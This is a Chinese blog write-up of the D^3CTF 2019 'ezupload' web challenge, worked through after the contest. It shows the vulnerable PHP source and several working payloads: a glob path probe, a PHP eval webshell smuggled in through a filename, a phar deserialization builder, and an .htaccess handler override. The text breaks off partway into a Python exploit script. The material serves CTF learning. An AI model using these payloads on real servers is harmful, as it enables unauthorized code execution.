@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x01 ezupload题目的环境https://github.com/Lou00/d3ctf_2019_ezupload下面是根据官方的wp来写的。题目一开始就给了源代码：12345678910111213141516171819202122232425262728293031323334">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D^3CTF的赛后复现一">
+<meta property="og:url" content="http://yoursite.com/2019/12/08/D-3CTF的赛后复现一/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x01 ezupload题目的环境https://github.com/Lou00/d3ctf_2019_ezupload下面是根据官方的wp来写的。题目一开始就给了源代码：12345678910111213141516171819202122232425262728293031323334">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/D%5E3CTF-2019-ezupload_1.jpg">
+<meta property="og:updated_time" content="2019-12-08T08:17:06.133Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D^3CTF的赛后复现一">
+<meta name="twitter:description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x01 ezupload题目的环境https://github.com/Lou00/d3ctf_2019_ezupload下面是根据官方的wp来写的。题目一开始就给了源代码：12345678910111213141516171819202122232425262728293031323334">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/D%5E3CTF-2019-ezupload_1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/08/D-3CTF的赛后复现一/">
+
+
+
+
+
+  <title>D^3CTF的赛后复现一 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/08/D-3CTF的赛后复现一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">D^3CTF的赛后复现一</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-08T16:14:59+08:00">
+                2019-12-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php-web/" itemprop="url" rel="index">
+                    <span itemprop="name">php-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。</p>
+<h4 id="0x01-ezupload"><a href="#0x01-ezupload" class="headerlink" title="0x01 ezupload"></a>0x01 ezupload</h4><h5 id="题目的环境"><a href="#题目的环境" class="headerlink" title="题目的环境"></a>题目的环境</h5><h6 id="https-github-com-Lou00-d3ctf-2019-ezupload"><a href="#https-github-com-Lou00-d3ctf-2019-ezupload" class="headerlink" title="https://github.com/Lou00/d3ctf_2019_ezupload"></a><a href="https://github.com/Lou00/d3ctf_2019_ezupload" target="_blank" rel="noopener">https://github.com/Lou00/d3ctf_2019_ezupload</a></h6><h6 id="下面是根据官方的wp来写的。"><a href="#下面是根据官方的wp来写的。" class="headerlink" title="下面是根据官方的wp来写的。"></a>下面是根据官方的wp来写的。</h6><h6 id="题目一开始就给了源代码："><a href="#题目一开始就给了源代码：" class="headerlink" title="题目一开始就给了源代码："></a>题目一开始就给了源代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><h6 id="通过审计代码可以发现存在反序列化漏洞-可以任意文件写入"><a href="#通过审计代码可以发现存在反序列化漏洞-可以任意文件写入" class="headerlink" title="通过审计代码可以发现存在反序列化漏洞,可以任意文件写入"></a>通过审计代码可以发现存在反序列化漏洞,可以任意文件写入</h6><h6 id="但是如果是用相对路径的话-发现无法写入"><a href="#但是如果是用相对路径的话-发现无法写入" class="headerlink" title="但是如果是用相对路径的话,发现无法写入"></a>但是如果是用相对路径的话,发现无法写入</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/D%5E3CTF-2019-ezupload_1.jpg" alt></p>
+<h6 id="在析构函数中工作目录可能会变"><a href="#在析构函数中工作目录可能会变" class="headerlink" title="在析构函数中工作目录可能会变"></a>在析构函数中工作目录可能会变</h6><h6 id="官方给的测试代码如下："><a href="#官方给的测试代码如下：" class="headerlink" title="官方给的测试代码如下："></a>官方给的测试代码如下：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"pwd"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"pwd"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$dir=<span class="keyword">new</span> dir();</span><br></pre></td></tr></table></figure>
+
+<h6 id="意思是要找到绝对路径"><a href="#意思是要找到绝对路径" class="headerlink" title="意思是要找到绝对路径"></a>意思是要找到绝对路径</h6><h6 id="所以第一部分的payload是"><a href="#所以第一部分的payload是" class="headerlink" title="所以第一部分的payload是"></a>所以第一部分的payload是</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=count&amp;url=1&amp;filename=1&amp;dir=glob:///var/www/html/*/upload/&#123;your_upload_path&#125;/*</span><br></pre></td></tr></table></figure>
+
+<h6 id="通过爆破得到路径-然而非了"><a href="#通过爆破得到路径-然而非了" class="headerlink" title="通过爆破得到路径(然而非了"></a>通过爆破得到路径(然而非了</h6><h6 id="得到路径后就可以通过文件名写shell了"><a href="#得到路径后就可以通过文件名写shell了" class="headerlink" title="得到路径后就可以通过文件名写shell了"></a>得到路径后就可以通过文件名写shell了</h6><h6 id="构造类似与下面的文件名"><a href="#构造类似与下面的文件名" class="headerlink" title="构造类似与下面的文件名"></a>构造类似与下面的文件名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=http://xxx&amp;filename=&lt;?php echo 1.1;eval($_GET[&quot;a&quot;]);</span><br></pre></td></tr></table></figure>
+
+<h6 id="构造反序列化"><a href="#构造反序列化" class="headerlink" title="构造反序列化"></a>构造反序列化</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($usedir,$url,$filename)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;userdir = $usedir;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> dir(<span class="string">'upload/&#123;your_upload_path&#125;'</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line">$b = <span class="keyword">new</span> dir($a,<span class="string">''</span>,<span class="string">'/var/www/html/xxx/upload/&#123;your_upload_path&#125;/2'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"__HALT_COMPILER();?&gt;;"</span>); </span><br><span class="line">$phar-&gt;setMetadata($b); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+
+<h6 id="上传后通过file-get-contents触发"><a href="#上传后通过file-get-contents触发" class="headerlink" title="上传后通过file_get_contents触发"></a>上传后通过file_get_contents触发</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=phar://upload/&#123;your_upload_path&#125;/1.jpg&amp;filename=2.jpg</span><br></pre></td></tr></table></figure>
+
+<h6 id="然后就会发现一个带有-lt-的txt文件"><a href="#然后就会发现一个带有-lt-的txt文件" class="headerlink" title="然后就会发现一个带有&lt;?的txt文件"></a>然后就会发现一个带有<code>&lt;?</code>的txt文件</h6><h6 id="最后上传一个-htaccess文件"><a href="#最后上传一个-htaccess文件" class="headerlink" title="最后上传一个.htaccess文件"></a>最后上传一个<code>.htaccess</code>文件</h6><h6 id="内容为"><a href="#内容为" class="headerlink" title="内容为"></a>内容为</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="即可解析php"><a href="#即可解析php" class="headerlink" title="即可解析php"></a>即可解析php</h6><h6 id="最后是bypass-open-basedir"><a href="#最后是bypass-open-basedir" class="headerlink" title="最后是bypass open_basedir"></a>最后是bypass open_basedir</h6><h6 id="下面是官方提供的payload"><a href="#下面是官方提供的payload" class="headerlink" title="下面是官方提供的payload"></a>下面是官方提供的payload</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'htaccess'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'AddHandler php7-script .txt\n'</span>)</span><br><span class="line">print(<span class="string">'[*] your file htaccess is create'</span>)</span><br><span class="line">os.popen(<span class="string">'mv htaccess /etc/nginx/php_file/1'</span>)</span><br><span 